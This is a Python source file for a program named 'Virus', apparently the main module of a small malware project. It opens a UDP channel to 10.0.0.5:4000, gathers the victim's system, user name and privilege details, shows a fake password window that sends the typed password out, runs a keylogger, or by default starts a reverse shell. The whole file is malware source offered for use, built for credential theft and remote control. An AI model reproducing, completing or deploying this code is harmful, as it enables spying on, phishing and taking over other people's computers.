import ctypes
import platform
import socket
import os
import time
import shutil

from FishingWindow import *
from UdpChannel import *
from Keylogger import *
from Information import *


"""
Class designed to run processes on victime machine
"""
class Virus:


    """
    Constructor.
    """
    def __init__(self):

        self.udpChannel     = UdpChannel("10.0.0.5", 4000)
        self.information    = Information()


    """
    Spying method sending target information.
    """
    def spying(self):
        
        self.information.obtainPlatformDescription()
        self.information.obtainComputerName()
        self.information.obtainUserName()
        self.information.obtainUserPrivileges()

        print(self.information.toString())



    """
    Fishing method.
    """
    def fishing(self):

        application = QApplication(sys.argv)

        window = FishingWindow(self.information.userName, self.udpChannel)
        window.show()
        window.passwordField.setFocus()

        application.exec()


    """
    Grabs information, then tries multiple vectors of attack.
    """
    def run(self):

        if len(sys.argv) < 2:

            self.udpChannel.runReverseShell()
        
        elif sys.argv[1] == "0":
        
            self.spying()
            self.fishing()

        elif sys.argv[1] == "1":

            Keylogger(self.udpChannel).run()


"""
-----------------------------------------------------
"""
if __name__ == '__main__':

    virus = Virus()
    virus.run()
